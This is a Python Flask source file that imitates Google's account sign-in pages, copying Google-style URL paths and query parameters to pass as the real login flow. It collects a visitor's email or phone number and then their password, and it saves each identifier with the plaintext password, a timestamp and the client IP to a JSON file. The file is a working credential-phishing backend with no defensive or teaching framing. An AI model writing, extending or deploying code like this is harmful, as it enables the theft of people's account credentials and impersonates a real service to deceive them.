import datetime
from flask import Flask, jsonify, redirect, render_template, request, session
import random
import re
import atexit
import json
from threading import Lock
import urllib.parse

app = Flask(__name__)
app.secret_key = "kW7aSZzzs8FVPxxRHkRlXw" # very secure secret_key
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

user_data = []
try:
    with open('user_data.json', 'r') as f:
        user_data.extend(json.load(f))
except (FileNotFoundError, json.JSONDecodeError):
    pass

data_lock = Lock()

def save_data_on_exit():
    with data_lock:
        with open('user_data.json', 'w') as f:
            json.dump(user_data, f, indent=2)
    print("Data saved to user_data.json")

atexit.register(save_data_on_exit)

EMAIL_REGEX = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
PHONE_REGEX = re.compile(r'^(\+\d{1,3})?[\s-]?(\(?\d{3}\)?[\s-]?\d{3}[\s-]?\d{4})$')

@app.route("/")
def home():
    dsh_val = f"S{random.randint(1000000000, 9999999999)}:{random.randint(1000000000000000, 9999999999999999)}"
    params = {
        "checkedDomains": "youtube",
        "continue": urllib.parse.quote("https://myaccount.google.com/?authuser=&pageId=none", safe=''),
        "dsh": dsh_val,
        "flowEntry": "AccountChooser",
        "flowName": "GlifWebSignIn",
        "pstMsg": "1"
    }
    query_string = "&".join(f"{k}={v}" for k, v in params.items())
    return redirect(f"/v3/signin/identifier?{query_string}")

@app.route("/info", methods=['POST'])
def get_info():
    data = request.get_json()
    if not data or 'email__phone' not in data:
        return jsonify({'status': 'error', 'message': 'No input provided'}), 400

    input_value = data['email__phone'].strip()
    
    if EMAIL_REGEX.fullmatch(input_value):
        session['validated_input'] = input_value
        return jsonify({'status': 'success', 'input': input_value, 'type': 'email'}), 200
    
    phone_match = PHONE_REGEX.fullmatch(input_value)
    if phone_match:
        digits = re.sub(r'\D', '', phone_match.group())
        if len(digits) == 10:
            formatted_phone = f"({digits[:3]}) {digits[3:6]}-{digits[6:]}"
        elif len(digits) == 11 and digits[0] == '1':
            formatted_phone = f"+1 ({digits[1:4]}) {digits[4:7]}-{digits[7:]}"
        else:
            formatted_phone = f"+{digits}"
        
        session['validated_input'] = formatted_phone
        session['input_type'] = 'phone'
        return jsonify({'status': 'success', 'input': formatted_phone, 'type': 'phone'}), 200
    
    return jsonify({'status': 'error', 'message': 'Please enter a valid email or phone number'}), 400

@app.route("/v3/signin/identifier")
def index():
    return render_template("index.html")

@app.route("/recover")
def recover_redirect():
    dsh_val = f"S{random.randint(1000000000, 9999999999)}:{random.randint(1000000000000000, 9999999999999999)}"
    params = {
        "checkedDomains": "youtube",
        "continue": urllib.parse.quote("https://myaccount.google.com/?authuser=&pageId=none", safe=''),
        "dsh": dsh_val,
        "flowEntry": "AccountChooser",
        "flowName": "GlifWebSignIn",
        "pstMsg": "1"
    }
    query_string = "&".join(f"{k}={v}" for k, v in params.items())
    return redirect(f"/signin/v2/usernamerecovery?{query_string}")

@app.route("/signin/v2/usernamerecovery/")
def recover_email():
    return render_template("recover_email.html")

@app.route("/signin/v2/challenge/pwd")
def challenge_pwd():
    dsh_val = f"S{random.randint(1000000000, 9999999999)}:{random.randint(1000000000000000, 9999999999999999)}"
    params = {
        "authuser": str(random.randint(0, 5)),
        "checkedDomains": "youtube",
        "checkConnection": "youtube%3A104",
        "cid": "1",
        "continue": urllib.parse.quote("https://myaccount.google.com/?authuser=&pageId=none", safe=''),
        "dsh": dsh_val,
        "flowEntry": "AccountChooser",
        "flowName": "GlifWebSignIn",
        "pstMsg": "1",
        "TL": ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=64))
    }
    query_string = "&".join(f"{k}={v}" for k, v in params.items())
    return redirect(f"/signin/v2/challenge/pwd/page?{query_string}")

@app.route("/signin/v2/challenge/pwd/page")
def challenge_pwd_page():
    print("Session contents:", session)
    if 'validated_input' not in session:
        print("No validated_input in session!")
        return redirect("/")
    
    validated_email = session['validated_input']
    print("Rendering with:", validated_email)
    return render_template("pass.html", validated_email=validated_email)

@app.route("/submit_password", methods=['POST'])
def submit_password():
    data = request.get_json()
    if not data or 'password' not in data:
        return jsonify({'status': 'error', 'message': 'No password provided'}), 400

    if 'validated_input' not in session:
        return jsonify({'status': 'error', 'message': 'Session expired'}), 400

    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr

    entry = {
        'identifier': session['validated_input'],
        'password': data['password'],
        'timestamp': datetime.datetime.now().isoformat(),
        'ip': ip
    }

    with data_lock:
        user_data.append(entry)
        print("Current user_data:", user_data)
    
    return jsonify({'status': 'success'}), 200

@app.route('/success-page')
def success():
    return render_template('final.html')

if __name__ == "__main__":
    app.run(debug=True, use_reloader=False)